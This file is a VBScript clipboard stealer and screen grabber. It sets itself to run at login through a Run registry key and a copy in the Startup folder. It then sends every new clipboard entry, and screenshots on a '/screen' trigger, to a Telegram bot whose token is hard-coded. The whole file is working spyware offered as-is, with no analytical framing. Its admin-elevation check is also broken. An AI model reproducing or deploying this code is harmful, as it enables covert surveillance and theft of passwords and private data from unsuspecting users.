' Check if the script is running with administrator privileges
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' If not running as admin, re-run with elevated privileges
If Not IsAdmin() Then
    ' Use the ShellExecute method to run the script as administrator
    objShell.Run "wscript.exe """ & WScript.ScriptFullName & """", 0, True
    WScript.Quit
End If

' Function to check if the script is running as administrator
Function IsAdmin()
    On Error Resume Next
    Dim objShell, objEnv
    Set objShell = CreateObject("WScript.Shell")
    Set objEnv = objShell.Environment("Process")
    
    ' Admin privileges are determined by the ability to access system folders like Program Files
    IsAdmin = (objEnv("ProgramFiles(x86)") <> "")
    On Error GoTo 0
End Function

' Add to startup registry for automatic execution on login
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClipboardMonitor"
strScriptPath = Chr(34) & WScript.ScriptFullName & Chr(34)

On Error Resume Next
If objShell.RegRead(strRegPath) = "" Then
    objShell.RegWrite strRegPath, "wscript.exe //B " & strScriptPath, "REG_SZ"
End If
On Error GoTo 0

' Save a copy of the script in the Startup folder to ensure it starts automatically
strStartupFolder = objShell.SpecialFolders("Startup")
strDestPath = strStartupFolder & "\" & objFSO.GetFileName(WScript.ScriptFullName)
If Not objFSO.FileExists(strDestPath) Then
    objFSO.CopyFile WScript.ScriptFullName, strDestPath
End If

' Telegram Bot details
botToken = "8193387679:AAGG3-UoQqRlTnrcBt7OxUJsB-cPUu8woPc"
chatID = "7055058745"

' Function to send message to Telegram
Function SendTelegramMessage(message)
    On Error Resume Next
    Dim xmlhttp
    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlhttp.Open "GET", "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatID & "&text=" & message, False
    xmlhttp.Send
    If Err.Number <> 0 Then Err.Clear
End Function

' Function to get text from clipboard
Function GetClipboardText()
    On Error Resume Next
    Dim clipboardText
    clipboardText = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
    If clipboardText = "" Then GetClipboardText = "No text found" Else GetClipboardText = clipboardText
    If Err.Number <> 0 Then Err.Clear
End Function

' Function to capture a screenshot and send it to Telegram
Function CaptureAndSendScreenshot()
    ' Path to nircmd tool (ensure this is correct)
    nircmdPath = "C:\Path\To\nircmd.exe" ' Change this to your nircmd path
    screenshotPath = "C:\Path\To\screenshot.png" ' Where the screenshot will be saved
    
    ' Run nircmd to capture the screenshot
    objShell.Run Chr(34) & nircmdPath & Chr(34) & " savescreenshot " & Chr(34) & screenshotPath & Chr(34), 0, True

    ' Send the screenshot to Telegram
    SendTelegramMessage "Sending screenshot..."
    Call SendPhotoToTelegram(screenshotPath)
End Function

' Function to send photo to Telegram
Function SendPhotoToTelegram(photoPath)
    On Error Resume Next
    Dim xmlhttp, boundary, body, fileData, fileName
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP.6.0")

    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & chatID & vbCrLf
    body = body & "--" & boundary & vbCrLf
    body = body & "Content-Disposition: form-data; name=""photo""; filename=""screenshot.png""" & vbCrLf
    body = body & "Content-Type: image/png" & vbCrLf & vbCrLf
    
    ' Open the file data
    Set fileData = CreateObject("ADODB.Stream")
    fileData.Type = 1 ' binary
    fileData.Open
    fileData.LoadFromFile photoPath
    body = body & fileData.Read(fileData.Size) & vbCrLf
    body = body & "--" & boundary & "--" & vbCrLf

    ' Send the request
    xmlhttp.Open "POST", "https://api.telegram.org/bot" & botToken & "/sendPhoto", False
    xmlhttp.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
    xmlhttp.Send body
    If Err.Number <> 0 Then Err.Clear
End Function

' Main loop to keep script running and monitor clipboard
On Error Resume Next
Do While True
    Dim currentClipboardText, lastClipboardText
    currentClipboardText = GetClipboardText()
    
    If currentClipboardText <> "" And currentClipboardText <> lastClipboardText Then
        lastClipboardText = currentClipboardText
        SendTelegramMessage "New clipboard text: " & currentClipboardText
    End If
    
    ' Check for /screen command to capture and send a screenshot
    If InStr(currentClipboardText, "/screen") > 0 Then
        CaptureAndSendScreenshot()
    End If
    
    WScript.Sleep 1000 ' Check every second
    If Err.Number <> 0 Then Err.Clear
Loop
